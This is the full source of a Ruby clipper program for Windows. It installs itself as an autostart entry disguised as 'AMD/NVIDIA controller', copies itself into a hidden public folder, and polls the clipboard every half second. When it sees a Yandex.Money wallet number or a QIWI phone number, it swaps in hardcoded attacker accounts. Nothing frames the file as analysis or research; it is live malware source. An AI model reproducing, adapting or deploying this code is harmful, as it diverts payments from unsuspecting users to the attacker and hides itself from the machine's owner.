require 'win32/clipboard'
require 'win32/registry'
require 'win32/api'
require 'fileutils'
include Win32
path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
access_type = Win32::Registry::KEY_ALL_ACCESS

Win32::Registry::HKEY_LOCAL_MACHINE.open(path, access_type) do |reg|
	reg["AMD/NVIDIA controller"] = "C:\\Users\\Public\\Documents\\Windows\\win32_scen.exe"
end

exit if defined?(Ocra)

pt = ENV["OCRA_EXECUTABLE"]
system '@echo OFF', 'mkdir', 'C:\Users\Public\Documents\Windows'
system '@echo OFF', 'attrib', '+h', 'C:\Users\Public\Documents\Windows', '/s', '/d'
if File.file?('C:\Users\Public\Documents\Windows\win32_scen.exe') == false
 FileUtils.cp(pt, 'C:\Users\Public\Documents\Windows\win32_scen.exe')
end

def cb_yand(string)
	arr = string.split("")
	indmn4 = arr.index("4")
	indmn1 = arr.index("1")
	indmn01 = arr.index("0")
	indmn02 = arr.index("0")
	if indmn4 != nil && indmn1 != nil && indmn01 != nil && indmn02 != nil
		if arr.index("4") == (arr.index("1"))-1 && arr.index("4") == (arr.index("0"))-2 && arr[arr.index("4")+3] == "0"
			ez = true
			return ez
		else
			ez = false
			return ez
		end
	end
end

def cb_qiwi(string)
	arr = string.split("")
	indmnpl = arr.index("+")
	if indmnpl != nil
		indmn1 = (indmnpl+1).to_i
		indmn2 = (indmnpl+2).to_i
		indmn3 = (indmnpl+3).to_i
		indmn4 = (indmnpl+4).to_i
		indmn5 = (indmnpl+5).to_i
		indmn6 = (indmnpl+6).to_i
		indmn7 = (indmnpl+7).to_i
		indmn8 = (indmnpl+8).to_i
		if indmn1 != nil && indmn2 != nil && indmn3 != nil && indmn4 != nil && indmn5 != nil && indmn6 != nil && indmn7 != nil && indmn8 != nil
			fut = ("0".."9")
			if fut.include?(arr[indmn1]) == true && fut.include?(arr[indmn2]) == true && fut.include?(arr[indmn3]) == true && fut.include?(arr[indmn4]) == true && fut.include?(arr[indmn5]) == true && fut.include?(arr[indmn6]) == true && fut.include?(arr[indmn7]) == true && fut.include?(arr[indmn8]) == true
				if arr[indmn1]!= nil && arr[indmn2]!= nil && arr[indmn3]!= nil && arr[indmn4]!= nil && arr[indmn5]!= nil && arr[indmn6]!= nil && arr[indmn7]!= nil && arr[indmn8]!= nil
					arr[indmn1] = arr[indmn1].to_i
					arr[indmn2] = arr[indmn2].to_i
					arr[indmn3] = arr[indmn3].to_i
					arr[indmn4] = arr[indmn4].to_i
					arr[indmn5] = arr[indmn5].to_i
					arr[indmn6] = arr[indmn6].to_i
					arr[indmn7] = arr[indmn7].to_i
					arr[indmn8] = arr[indmn8].to_i
					if arr[indmn1].class == Fixnum && arr[indmn2].class == Fixnum && arr[indmn3].class == Fixnum && arr[indmn4].class == Fixnum && arr[indmn5].class == Fixnum && arr[indmn6].class == Fixnum && arr[indmn7].class == Fixnum && arr[indmn8].class == Fixnum
						ez = true
						return ez
					end
				end
			end
		end
	end
end

while true
	if cb_yand(Clipboard.data) == true
		Clipboard.set_data("410012676845692", format=Clipboard::TEXT)
	elsif cb_qiwi(Clipboard.data) == true
		Clipboard.set_data("+79345346732", format=Clipboard::TEXT)
	end
	sleep(0.5)
end
